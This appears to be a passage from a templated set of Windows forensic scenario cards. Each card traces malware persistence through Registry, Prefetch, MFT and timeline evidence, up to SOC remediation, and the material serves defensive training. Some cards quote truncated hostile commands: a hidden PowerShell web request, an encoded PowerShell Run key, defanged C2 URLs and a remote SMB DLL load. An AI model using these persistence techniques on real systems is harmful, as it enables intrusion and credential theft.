- **Attack Steps**: High CPU usage prompts investigation. Timeline shows minerstarter.exe dropped into C:\ProgramData\UpdateDriver\ at 8:21 AM. Within a minute, scheduled task DriverUpdateService created via schtasks. Task XML points to miner executable. Plaso parses XML, Registry key, MFT entries, and Prefetch. Timesketch timeline aligns all components proving persistent crypto-miner behavior. Miner connects to known pool. SOC kills task, cleans folder, blocks pool IPs.
- **Detection**: Task + Registry + MFT timeline
- **Solution**: Full chain trace
- **Tags**: #cryptomining #taskpersist #timelinecpu

## Web History + MFT Timeline Links ZIP Download to Credential Stealer

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: ZIP-delivered stealer
- **MITRE**: T1204.002, T1555
- **Impact**: ZIP → EXE → info log
- **Tools**: Plaso, Timesketch, Browser Cache
- **Scenario**: User downloads ZIP that unpacks and runs info-stealer
- **Attack Steps**: Host under investigation for credential theft. Plaso shows ZIP file offerform.zip downloaded at 3:11 PM from jobscentral.org. Timeline confirms unzip at 3:12 and execution of apply.exe at 3:13 PM. EXE runs silently, MFT shows it creates data.log in hidden folder. Timesketch overlays browser activity, file execution, registry changes (adding run key), and network beaconing. Timeline proves ZIP → extract → steal chain. IOC created and URL blocked at perimeter.
- **Detection**: MFT + Registry + browser
- **Solution**: Timeline of file chain
- **Tags**: #zipstealer #credentialdump #timelinedownload

## Timeline Links VBA Macro Execution to Persistence via Startup Folder

- **Attack Type**: Timeline Analysis
- **Target**: Windows
- **Vulnerability**: Macro → EXE → Startup folder persist
- **MITRE**: T1059.005, T1547.001
- **Impact**: Excel → macro → drop → launch
- **Tools**: Plaso, Timesketch, Office Logs
- **Scenario**: Malicious Excel macro drops EXE into Startup
- **Attack Steps**: User opens financials.xlsx at 2:08 PM. Plaso extracts metadata from Excel logs, Registry, MFT. Timeline shows Excel macro auto-runs script that drops servicehost.exe into C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup. Prefetch confirms execution. Registry analysis shows no Run keys, suggesting Startup folder used for persistence. Timeline aligns macro execution → file drop → boot-time launch. SOC removes EXE and disables macros org-wide.
- **Detection**: Excel + Startup folder
- **Solution**: Plaso timeline of drop path
- **Tags**: #vbapersist #macrotimeline #excelabuse

## Registry Key and Prefetch Confirm Persistence via AppInit_DLLs Injection

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: AppInit_DLLs Injection
- **MITRE**: T1546.010
- **Impact**: Registry key abuse for global DLL injection
- **Tools**: FTK Imager, Registry Explorer, Windows Sysinternals
- **Scenario**: Malicious DLL injected into every process via legacy Registry key
- **Attack Steps**: Analyst acquires full disk image and volatile memory. Registry Explorer is used to parse HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs. Timeline shows that at 04:12 AM, the value was altered to include malicioushook.dll. MFT metadata confirms the DLL was dropped to C:\Windows\System32\. Prefetch analysis reveals that legitimate processes like explorer.exe, chrome.exe, and winlogon.exe subsequently loaded the DLL during startup. Execution timestamps match user login. The injected DLL spawns background threads performing keylogging and browser form scraping. Further analysis of memory confirms the DLL remained resident in all GUI-based processes. Timeline maps exact point of registry injection to prefetch and memory evidence. IOC created for the DLL hash and the registry key change. Defense team creates GPO to prevent AppInit_DLL usage.
- **Detection**: Registry + Prefetch + Memory
- **Solution**: Timeline + MFT metadata correlation
- **Tags**: #dllinjection #registryhijack #appinit

## Prefetch and Registry Show Persistence via Run Key and Scheduled Task Combo

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Dual persistence via Run key + task
- **MITRE**: T1547.001, T1053.005
- **Impact**: Registry + task scheduler for redundancy
- **Tools**: FTK Imager, Autoruns, Prefetch Parser
- **Scenario**: Attacker establishes dual persistence through registry and task
- **Attack Steps**: During forensics of a system compromised via phishing, analyst parses registry hives and scheduled tasks. At 6:42 PM, Registry Explorer reveals a new entry under HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svcstart pointing to C:\Users\Admin\AppData\Roaming\svchostupdater.exe. In parallel, Task Scheduler logs indicate the creation of a task named SystemCoreUpdate, set to run every 30 minutes using the same binary. Prefetch analysis confirms execution of svchostupdater.exe every login and task cycle. The file mimics svchost.exe and evades casual detection. Prefetch metadata shows repeated execution by taskeng.exe. Timeline overlays registry write, task creation, file modification, and scheduled executions. Incident response disables task and removes registry entry.
- **Detection**: Registry + Prefetch + Scheduled Task
- **Solution**: Timeline chain of registry + task trigger
- **Tags**: #runkey #schtaskpersist #dualentry

## Registry and Prefetch Confirm Macro-Based Dropper Delivered via Excel

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Macro dropper with RunOnce registry key
- **MITRE**: T1566.001, T1547.001
- **Impact**: Excel macro dropper with RunOnce
- **Tools**: FTK Imager, OfficeMacroAnalyzer, Registry Viewer
- **Scenario**: Excel macro creates persistence key and drops payload
- **Attack Steps**: Timeline begins with Excel file invoiceQ4.xlsm opened at 10:14 AM. Registry reveals entry added to HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\autoupd pointing to payload.exe. MFT confirms the binary was dropped into %APPDATA%\Roaming\Microsoft\UpdateServices\. Prefetch analysis proves execution of the binary within 1 minute of Excel macro invocation. Prefetch data also confirms execution by explorer.exe upon user logon. The macro embedded in Excel was obfuscated, but decoded to reveal Shell("cmd /c echo...") commands. Timeline clearly shows Excel macro → file write → registry injection → execution, proving attack vector. IOC generated from macro hash and persistence path.
- **Detection**: Office + Registry + Prefetch
- **Solution**: Timeline of macro → key → EXE exec
- **Tags**: #excelmacro #runoncepersist #timelinedropper

## Prefetch Confirms Use of Compiled HTA Payload Triggered from Registry

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: HTA abuse via shell registry hijack
- **MITRE**: T1218.005
- **Impact**: HTA + registry override → stager exec
- **Tools**: FTK Imager, HTA Disassembler, Prefetch Parser
- **Scenario**: HTA file invoked through registry shell override
- **Attack Steps**: During endpoint triage, suspicious mshta.exe activity is flagged. Prefetch analysis identifies mshta.exe executed with a local path: C:\Users\Public\Documents\update.hta. Registry shows modification to the .html shell command key at HKCR\htmlfile\shell\open\command pointing to mshta.exe update.hta. This redirect causes any .html file opening to trigger malicious code. HTA contains obfuscated JavaScript that executes PowerShell stager. Prefetch confirms update.hta and powershell.exe were executed seconds apart. Registry modification timestamp matches prefetch exec. Timeline proves shell hijack → HTA launch → PowerShell. SOC removes registry override, blacklists HTA.
- **Detection**: Registry + HTA + Prefetch
- **Solution**: Timeline of hijack chain
- **Tags**: #htaabuse #registryshell #prefetchtimeline

## Registry Key Injection Enables VBS Payload on User Login

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: VBS execution via registry Run key
- **MITRE**: T1547.001
- **Impact**: VBS → registry → autorun on login
- **Tools**: FTK Imager, Autoruns, VBS Analyzer
- **Scenario**: VBS script added to user Run key for silent execution
- **Attack Steps**: VBS script found running in memory. Registry Explorer shows new value under HKCU\Software\Microsoft\Windows\CurrentVersion\Run\winsvc pointing to C:\Users\User\AppData\Roaming\logrotate.vbs. File metadata shows it was dropped 2 minutes prior to registry key creation. Prefetch confirms wscript.exe launched logrotate.vbs multiple times over 3-day period. Script downloads further binaries from IP 185.x.x.x. Timeline shows script drop → registry key → repeated background launches. Registry entry and VBS hash blacklisted. SOC hardens GPO against script execution.
- **Detection**: Registry + Prefetch + MFT
- **Solution**: Timeline of scripting persistence
- **Tags**: #vbspersistence #runkeyvbs #logrotateattack

## Registry + Prefetch Reveal System Backdoor via Services Key Injection

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Registry services backdoor
- **MITRE**: T1543.003
- **Impact**: Registry service install → boot exec
- **Tools**: FTK Imager, Services.msc, Prefetch Parser
- **Scenario**: Attacker adds malicious service via Registry
- **Attack Steps**: Registry shows manual addition to HKLM\SYSTEM\CurrentControlSet\Services\UpdateService. Binary path set to C:\Program Files\Updater\svc.exe. MFT confirms file drop at 1:05 PM, registry key created at 1:06 PM. Prefetch logs show svc.exe executed at system boot. DLL embedded within svc.exe opens hidden shell on port 8888. Timeline confirms chain of backdoor injection using services key. SOC disables and deletes service entry, analyzes executable for C2 behavior.
- **Detection**: Registry + Services + Prefetch
- **Solution**: Timeline of registry to service execution
- **Tags**: #serviceshijack #backdoorpersist #registrysvc

## Registry and Prefetch Link Obfuscated LNK File to Persistence Payload

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: LNK + registry combo for persistence
- **MITRE**: T1547.001, T1204.002
- **Impact**: LNK → batch → registry → persist
- **Tools**: FTK Imager, LNK Parser, Autoruns
- **Scenario**: LNK shortcut launches batch file on startup via registry
- **Attack Steps**: Investigation of rogue process finds C:\Users\Admin\StartMenu\Programs\Startup\chrome.lnk. LNK launches cmd /c start c:\payload\reboot.bat. Registry HKCU\Software\Microsoft\Windows\CurrentVersion\Run shows entry added pointing to same batch file. Prefetch shows cmd.exe repeatedly executing reboot.bat. Timeline analysis confirms batch creation, shortcut placement, registry entry, and repeated executions all within 1-hour span. Malicious payload hidden under legit name. Shortcut hash blacklisted.
- **Detection**: LNK + Registry + Prefetch
- **Solution**: Shortcut + key timeline mapping
- **Tags**: #lnkpersist #regautorun #shortcutabuse

## Prefetch Confirms Java Exploit Delivered via Dropped .jar File

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: JAR → EXE via Java exploit
- **MITRE**: T1204.002
- **Impact**: Email → JAR → deserialization → EXE
- **Tools**: FTK Imager, JAR Disassembler, Prefetch Parser
- **Scenario**: Attacker drops and executes malicious JAR from email attachment
- **Attack Steps**: Email leads to download of invoice.jar. MFT confirms file write at 7:11 AM. Registry logs show no immediate key changes, but Prefetch confirms javaw.exe executed the JAR file at 7:12 AM. JAR uses legacy Java deserialization exploit to drop EXE. File servicehost.exe written to %APPDATA% and executed silently. Prefetch shows both javaw.exe and servicehost.exe execution. Timeline proves payload chain from JAR to final EXE. Analyst blocks all outbound connections from Java until patched.
- **Detection**: JAR + Prefetch + file metadata
- **Solution**: Prefetch links execution flow
- **Tags**: #javaexploit #jarpayload #prefetchjar

## Registry Keys Indicate Credential Theft Tool Execution

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Credential theft via registry drop
- **MITRE**: T1003.001
- **Impact**: registry drop → EXE → lsass scan
- **Tools**: FTK Imager, Mimikatz YARA, Registry Parser
- **Scenario**: Execution of Mimikatz variant leaves registry traces
- **Attack Steps**: Suspicious behavior on privileged account. Registry analysis finds recently added keys under HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\Katz, pointing to m.exe. File dropped and executed from C:\Temp. Prefetch confirms m.exe invoked via cmd.exe with elevated privileges. Memory dump confirms Mimikatz-like function calls for lsass memory scraping. Timeline analysis proves credential theft occurred shortly after login. SOC invalidates all tokens and credentials.
- **Detection**: Registry + Memory + Prefetch
- **Solution**: Timeline proves post-login theft
- **Tags**: #mimikatzclone #lsassdump #regtrack

## Registry + Prefetch Confirm RAT Launched via COM Hijacking

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: COM hijack for persistence
- **MITRE**: T1546.015
- **Impact**: DLL → registry → explorer/winlogon inject
- **Tools**: FTK Imager, Registry Explorer, Autoruns
- **Scenario**: COM class hijacked to point to backdoor DLL
- **Attack Steps**: Forensic review reveals persistent backdoor launched through COM hijack. Registry shows new CLSID HKCR\CLSID\{D63E0CE2-A0A2} with InProcServer32 set to C:\ProgramData\svcbackdoor.dll. DLL created 2 minutes before registry key edit. Prefetch analysis reveals repeated loading of DLL by explorer.exe and winlogon.exe. Memory confirms thread injection. Timeline proves attacker used COM hijack to persist malicious DLL that activates during standard shell processes. SOC blocks CLSID and removes rogue DLL.
- **Detection**: Registry + DLL + Prefetch
- **Solution**: Timeline of class hijack chain
- **Tags**: #comhijack #regdllpersist #explorerinject

## Registry Hijack Enables DLL Execution via Control Panel Item

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Control Panel DLL hijack
- **MITRE**: T1546.016
- **Impact**: Registry + Control.exe → DLL load
- **Tools**: FTK Imager, Registry Explorer, Autoruns
- **Scenario**: Control Panel extension used to launch attacker DLL
- **Attack Steps**: Analysts identify unusual control panel crashes. Registry Explorer reveals malicious entry in HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ControlPanel\NameSpace\{CLSID} pointing to C:\Users\Admin\AppData\Local\Temp\cpanel.dll. The attacker manually registered this DLL to load with the Control Panel applet. MFT confirms the DLL write 2 minutes prior to registry modification. Prefetch shows control.exe loading cpanel.dll multiple times during user interaction. Timeline constructed with Plaso confirms entire chain: DLL creation → registry hijack → repeated execution. Memory inspection shows DLL opens C2 socket silently. IOC created for DLL hash, CLSID path. GPO hardened to block namespace injection.
- **Detection**: Registry + Prefetch + MFT
- **Solution**: Registry-based persistence flow
- **Tags**: #controlpanelhijack #dllinject #namespaceabuse

## Registry Evidence of Persistence via WMI Subscription to Launch HTA

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: WMI-based persistence via HTA
- **MITRE**: T1084, T1546.003
- **Impact**: WMI → HTA → persistence
- **Tools**: FTK Imager, Event Viewer, WMI Explorer
- **Scenario**: Attacker sets permanent WMI event to launch malicious HTA file
- **Attack Steps**: Analyst uncovers persistence without typical registry Run key usage. Forensic review of ROOT\Subscription reveals __EventFilter, CommandLineEventConsumer, and __FilterToConsumerBinding objects registered. The CommandLineEventConsumer launches mshta.exe to load update.hta from %APPDATA%. Registry logs confirm creation of WMI subscription at 12:01 PM. MFT confirms update.hta write 2 minutes before. Prefetch confirms repeated execution of mshta.exe. Timeline matches WMI trigger events with HTA launches. Memory dump reveals HTA executes embedded PowerShell beacon. SOC disables WMI subscription and blacklists HTA hash.
- **Detection**: WMI + Registry + Prefetch
- **Solution**: Registry + event correlation timeline
- **Tags**: #wmipersistence #htaexec #wmihijack

## Prefetch Reveals Reverse Shell Triggered via Registry Shell Override

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Shell override for reverse shell
- **MITRE**: T1546.001
- **Impact**: Registry hijack → PS reverse shell
- **Tools**: FTK Imager, Prefetch Parser, Autoruns
- **Scenario**: Registry altered to run reverse shell when opening folders
- **Attack Steps**: Strange shell behavior detected. Registry shows HKCR\Directory\shell\open\command modified to run cmd.exe /c powershell -w hidden -nop -c Invoke-WebRequest ... targeting external IP. Modification timestamp 9:14 AM, same time new process behavior starts. Prefetch shows powershell.exe repeatedly launched when folder icons accessed. MFT confirms fileless reverse shell created during interaction. Timeline proves shell hijack → reverse connection behavior. Registry entry deleted, firewall rule applied. IOC recorded.
- **Detection**: Registry + Prefetch + PS logs
- **Solution**: Timeline exposes stealth exec path
- **Tags**: #shellhijack #reverseps #regmanipulate

## Registry & Prefetch Prove Persistence via Malicious Image File Execution Options

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Image File Execution Options abuse
- **MITRE**: T1546.012
- **Impact**: IFEO key hijacks benign app launch
- **Tools**: FTK Imager, Registry Explorer, Sysinternals
- **Scenario**: Registry IFEO key forces execution of malware when target app starts
- **Attack Steps**: Analyst finds fake version of notepad.exe running malware. Registry reveals HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe with Debugger value pointing to maldebugger.exe. MFT confirms file written to C:\ProgramData\. Prefetch analysis shows maldebugger.exe launched during normal Notepad execution. Timeline confirms: registry key creation → dropper deployment → launch via user activity. Malware keylogs and sends clipboard data. IOC shared and GPO enforced to block IFEO usage.
- **Detection**: Registry + MFT + Prefetch
- **Solution**: Notepad trigger → malware exec
- **Tags**: #ifeohijack #notepadexploit #regpersist

## Registry Keys Create Hidden VPN Autostart Backdoor

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Dual EXE via Run registry key
- **MITRE**: T1547.001
- **Impact**: Registry → dual process launch
- **Tools**: FTK Imager, Autoruns, Registry Viewer
- **Scenario**: Attacker sets VPN GUI app to load hidden malware on connect
- **Attack Steps**: VPN tool used as persistence channel. Registry analysis finds Run key for vpnconnect.exe replaced with wrapper that launches vpnconnect.exe && malware.exe. Prefetch confirms both executables triggered at user logon. Memory dump of VPN process shows injected code. Timeline built from registry key, prefetch and MFT metadata. Timeline proves compound launch chain at startup. SOC deploys VPN profile hardening and disables dual EXE auto-start behavior.
- **Detection**: Registry + Prefetch + Memory
- **Solution**: Timeline from key to memory injection
- **Tags**: #vpnbackdoor #autostartpersist #registrychain

## Registry Confirms Browser Helper Object Hijack for Stealth Injection

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Browser Helper Object persistence
- **MITRE**: T1176
- **Impact**: Registry → IE → DLL inject
- **Tools**: FTK Imager, IEForensics, Registry Explorer
- **Scenario**: Attacker inserts BHO to inject malicious JS into Internet Explorer
- **Attack Steps**: Registry shows new BHO registered under HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{CLSID} with path to injector.dll. MFT confirms DLL created 2 mins prior. Prefetch confirms Internet Explorer loading DLL via iexplore.exe. DLL captures form inputs and browser traffic. Timeline shows registry write, DLL drop, and browser usage correlation. SOC disables BHO loading via GPO and removes DLL.
- **Detection**: Registry + Prefetch + Browser logs
- **Solution**: Browser forensics timeline chain
- **Tags**: #ieinject #bhoabuse #registrydll

## Registry & Prefetch Confirm Exploit Chain Triggered from USB Autorun

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: USB autorun + registry persist
- **MITRE**: T1091, T1547.001
- **Impact**: USB → autorun → registry → exec
- **Tools**: FTK Imager, USBLogView, Prefetch Parser
- **Scenario**: Malware launched via USB using autorun.inf and registry plugin
- **Attack Steps**: USB drop leads to infection. MFT shows USB mounted at 3:05 PM. autorun.inf file directs to startme.exe. Registry logs show USB plugin triggers new Run key: HKCU\...\startme. Prefetch confirms repeated startme.exe execution. Timeline overlays USB insertion, registry write, and EXE execution within 90 seconds. Memory shows startme.exe spawns C2 channel. IOC crafted and USB policies hardened.
- **Detection**: Registry + USB + Prefetch
- **Solution**: Timeline of removable drive attack
- **Tags**: #usbautorun #startmepersist #timelineusb

## Registry Entry Abused to Trigger DLL via LoadAppInit_DLLs

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: DLL injection via AppInit settings
- **MITRE**: T1546.010
- **Impact**: Registry DLL → GUI process injection
- **Tools**: FTK Imager, Registry Explorer, Sysinternals
- **Scenario**: DLL forced to load into all GUI processes
- **Attack Steps**: Registry key HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs set to 1, enabling injection. AppInit_DLLs key lists injectme.dll. MFT shows DLL dropped 1 min earlier. Prefetch confirms explorer.exe and chrome.exe load DLL. Memory confirms injected shellcode threads. Timeline aligns drop, key injection, process execution. DLL hash blacklisted and GPO disables legacy mechanism.
- **Detection**: Registry + Prefetch + Memory
- **Solution**: Timeline of multi-process injection
- **Tags**: #appinitdll #dllinjectregistry #timelineinject

## Prefetch and Registry Prove Logon Script Hijacked to Launch RAT

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Logon script replacement
- **MITRE**: T1037.001
- **Impact**: Registry hijack → login script → RAT
- **Tools**: FTK Imager, Group Policy Editor, Prefetch
- **Scenario**: Attacker replaces user logon script with malware
- **Attack Steps**: Logon delay investigated. Registry under HKCU\Environment\UserInitMprLogonScript shows new script path: logme.bat. File launches rat.exe from %APPDATA%. Prefetch confirms cmd.exe, logme.bat, and rat.exe launched during user login. Timeline overlays registry key modification with process launch chain. SOC disables script and resets user profile.
- **Detection**: Registry + Prefetch + MFT
- **Solution**: Timeline of login-time malware
- **Tags**: #logonscript #ratactivation #logindelay

## Registry & Prefetch Show Registry Persistence via Scheduled Registry Restore

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Task restores malicious registry key
- **MITRE**: T1053.005, T1547.001
- **Impact**: Task → batch → registry re-import
- **Tools**: FTK Imager, Task Scheduler Viewer, Prefetch Parser
- **Scenario**: Attacker uses batch + task to restore malicious registry keys
- **Attack Steps**: SOC finds registry key for persistence deleted but reappears. Timeline reveals restorekeys.bat dropped at 7:30 AM and scheduled via Task Scheduler. Batch re-imports malicious .reg file containing Run key entries. Prefetch confirms task runs hourly. Registry diffing proves same key keeps restoring. Timeline shows loop of key deletion → task → restore. SOC disables task, removes batch + .reg file.
- **Detection**: Registry + Task + Prefetch
- **Solution**: Timeline exposes persistence loop
- **Tags**: #regloop #taskrestore #autorundefense

## Registry Persistence via UserInit Key with DLL Injection

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Registry hijack + DLL injection
- **MITRE**: T1547.001
- **Impact**: Winlogon hijack persistence
- **Tools**: FTK Imager, Registry Explorer, Plaso, Volatility
- **Scenario**: Attacker modifies UserInit registry key to include malicious DLL loader
- **Attack Steps**: The analyst performs a forensic review of a compromised Windows host suspected of maintaining persistence after remediation. Registry analysis focuses on HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserInit, which should default to C:\Windows\system32\userinit.exe,. Instead, the key has been modified to userinit.exe, loader32.dll. Timeline analysis via Plaso reveals this modification occurred on July 2nd at 02:17:13 UTC, correlating with the last known attacker presence. MFT confirms loader32.dll was written into C:\ProgramData\Microsoft\Loaders\ 90 seconds prior. Prefetch records show winlogon.exe triggering loader32.dll immediately during every user login. Memory analysis via Volatility shows loader32.dll was injected into the explorer.exe process and created remote threads executing shellcode that opens a socket connection to 185.x.x.x over port 443. The DLL's code section is packed and uses API obfuscation. A full chain of events—DLL drop, registry manipulation, and scheduled execution—is reconstructed in a forensic timeline. Remediation included deletion of the key, DLL removal, and registry ACL lockdown.
- **Detection**: Registry + Prefetch + Memory + MFT
- **Solution**: UserInit key deviation with injected DLL
- **Tags**: #userinitpersist #dllinject #registryabuse

## Registry & Prefetch Confirm DLL Sideloading via Fake AV Component

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: DLL sideload via AV process + reg Run key
- **MITRE**: T1574.002
- **Impact**: Registry Run + sideloaded payload
- **Tools**: FTK Imager, Autoruns, PEStudio, Process Monitor
- **Scenario**: Attacker leverages registry and DLL sideload to persist within AV software path
- **Attack Steps**: During IR on a system exhibiting outbound C2 traffic, analysts note a suspicious binary within the directory C:\Program Files (x86)\TrendAV\UpdateManager\. The binary AVLoader.exe appears signed and legit, but its import table refers to update.dll. Registry under HKLM\Software\Microsoft\Windows\CurrentVersion\Run shows a persistence key for AVLoader.exe. Prefetch confirms this binary is executed every boot. The dropped update.dll (malicious) is placed in the same directory and sideloaded. Memory analysis reveals that update.dll dynamically decrypts and loads shellcode post-process start using VirtualAlloc and CreateThread. Timeline via Plaso reconstructs: dropped DLL → Run key entry → Prefetch evidence of execution → shellcode injection. Registry is modified at 3:44 AM, DLL dropped at 3:42 AM. SOC responds by revoking DLL permissions, removing Run key, and blacklisting SHA-256.
- **Detection**: Registry + Prefetch + Memory
- **Solution**: Registry anchors fake DLL sideload
- **Tags**: #sideloading #runkeyabuse #avbackdoor

## Prefetch Reveals Autorun LNK File Loading Remote JavaScript via wscript.exe

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: LNK autorun + JS backdoor + registry
- **MITRE**: T1204.002, T1547.001
- **Impact**: Startup LNK and registry redundancy
- **Tools**: FTK Imager, LNK Parser, Prefetch Tools, Autoruns
- **Scenario**: Obfuscated LNK file in Startup folder runs JS via WScript silently
- **Attack Steps**: During triage of a suspicious user account, forensic analysts inspect C:\Users\JohnDoe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup. A LNK file named winservice.lnk points to wscript.exe "C:\Users\JohnDoe\AppData\Local\Temp\remote.js". MFT confirms the LNK was created at 07:41 AM and the JS dropped just minutes before. Prefetch data confirms that wscript.exe was launched on every user login with the same parameters. The JS is heavily obfuscated but decodes to a multi-stage downloader that connects to hxxp://malic.site/shell1.js. Registry inspection reveals that the attacker also added a redundant Run key for the same script, ensuring dual persistence. Timeline aligns all: LNK + Run key + JS execution at login. Memory forensics reveals injected shellcode in svchost.exe. SOC actions include script and LNK removal, registry key cleanup, and AppLocker policy to block wscript.exe.
- **Detection**: Registry + Prefetch + MFT + Memory
- **Solution**: Chain of shortcut → JS → shell
- **Tags**: #lnkjsbackdoor #registryautorun #prefetchflow

## Registry & Prefetch Identify Credential Dump Tool Triggered via Registry Shell Override

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Registry filetype shell hijack for credential dumping
- **MITRE**: T1003.001, T1546.001
- **Impact**: Registry → filetype override → mimikatz tool
- **Tools**: FTK Imager, Registry Explorer, Sysinternals ProcMon
- **Scenario**: Attacker modifies registry to run Mimikatz-style tool on .txt file open
- **Attack Steps**: System admin reports .txt files opening strange binaries. Registry under HKCR\txtfile\shell\open\command has been altered to run cmd.exe /c C:\Users\Public\credscraper.exe. MFT shows that credscraper.exe was dropped to disk 2 minutes before registry edit. Prefetch shows cmd.exe and credscraper.exe being triggered when the user attempts to open readme.txt. Process Monitor traces show that credscraper.exe spawns a subprocess accessing lsass.exe via OpenProcess and ReadProcessMemory. Memory inspection reveals that the tool dumps plaintext credentials into a local file. Timeline proves file open → registry shell hijack → credential dump in real time. SOC blocks filetype associations via registry ACLs and triggers password reset.
- **Detection**: Registry + Prefetch + ProcMon
- **Solution**: Timeline links user file open to creds dump
- **Tags**: #shelloverride #creddumper #regfileabuse

## Registry & Prefetch Correlate COM Hijack with Silent DLL Persistence

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: COM CLSID hijack for persistent DLL loading
- **MITRE**: T1546.015
- **Impact**: Registry + COM class + DLL load
- **Tools**: FTK Imager, Registry Explorer, Autoruns, Volatility
- **Scenario**: Attacker hijacks COM class to load a stealthy persistence DLL
- **Attack Steps**: COM-based persistence found via autoruns triage. Registry key under HKCR\CLSID\{9A3F6B32-...} has InprocServer32 value pointing to C:\Users\Public\svcshim.dll. MFT confirms the DLL was dropped around 5:13 PM. Prefetch shows that explorer.exe and winlogon.exe consistently load svcshim.dll. Volatility plugin ldrmodules shows svcshim.dll injected into GUI processes during boot. Further memory analysis proves it spawns shellcode that sets up persistence beacon. Timeline overlays registry edit, file drop, and load behavior. SOC responds by cleaning up CLSID references and blacklisting the DLL hash.
- **Detection**: Registry + Prefetch + Memory
- **Solution**: Full DLL execution lifecycle
- **Tags**: #comdllhijack #persistence #prefetchclue

## Prefetch Timeline Shows AutoStart via Registry and Remote DLL Injection

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Run key + remote DLL via SMB
- **MITRE**: T1574.001
- **Impact**: Registry EXE → DLL inject over network
- **Tools**: FTK Imager, Autoruns, ProcMon, Volatility
- **Scenario**: Registry Run key launches EXE which maps malicious DLL over SMB
- **Attack Steps**: Suspicious outbound SMB traffic detected. Registry Run key under HKCU\Software\Microsoft\Windows\CurrentVersion\Run\autoboot points to C:\Windows\Temp\autorun.exe. MFT confirms EXE was dropped 3 minutes before registry entry. Prefetch reveals autorun.exe launches every system boot. ProcMon shows that it loads a DLL from a UNC path \\192.168.1.33\malshare\stage1.dll using LoadLibrary. Volatility confirms injected DLL threads in memory. Timeline aligns drop, reg key, execution, and network activity. SOC blocks SMB connection and removes artifacts.
- **Detection**: Registry + Prefetch + Memory
- **Solution**: Remote DLL loading flow mapped
- **Tags**: #remotedll #runkeyinject #smbside

## Registry Run Key Triggers PowerShell Loader with Hidden C2 Beacon

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: PowerShell payload in registry key
- **MITRE**: T1059.001
- **Impact**: Encoded script executes persistently
- **Tools**: FTK Imager, PowerShell Logs, Registry Viewer
- **Scenario**: Base64 PS payload executed from registry at each boot
- **Attack Steps**: Registry Run key under HKCU\...\Run\updater contains powershell -enc <Base64Payload>. Base64 decodes into a long obfuscated script that includes Invoke-Expression and embedded C2 addresses. Prefetch confirms powershell.exe launches at every login. Timeline shows key addition, matching process creation logs, and memory artifacts. Analyst confirms beacon sends regular POSTs to hxxp://stage.c2domain.com/ping. SOC disables key, blocks outbound IPs, and deploys PowerShell script block policies.
- **Detection**: Registry + Prefetch + Network
- **Solution**: Timeline validates C2 PowerShell
- **Tags**: #powershellpersist #b64loader #regscript

## Registry + Prefetch Reveal ServiceDLL Set for Silent Execution

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: ServiceDLL loading via registry
- **MITRE**: T1543.003
- **Impact**: Malicious service auto-start DLL
- **Tools**: FTK Imager, Services Viewer, Registry Explorer
- **Scenario**: Malicious service DLL executes silently via registry config
- **Attack Steps**: Registry key HKLM\SYSTEM\CurrentControlSet\Services\UpdaterSvc\Parameters shows ServiceDLL value pointing to svc32.dll. MFT shows DLL dropped at 6:10 PM. Prefetch logs confirm services.exe launching svc32.dll. Volatility shows shellcode injected via this DLL using CreateRemoteThread. Timeline shows drop → registry → persistent loading. SOC disables service, deletes DLL and registry keys.
- **Detection**: Registry + Services + Prefetch
- **Solution**: DLL boot execution path logged
- **Tags**: #servicedll #registryautostart #svcbackdoor

## Registry & Prefetch Identify Scheduled EXE Triggered by Modified Task XML

- **Attack Type**: Registry & Prefetch Analysis
- **Target**: Windows
- **Vulnerability**: Scheduled task XML tamper + registry timestamp
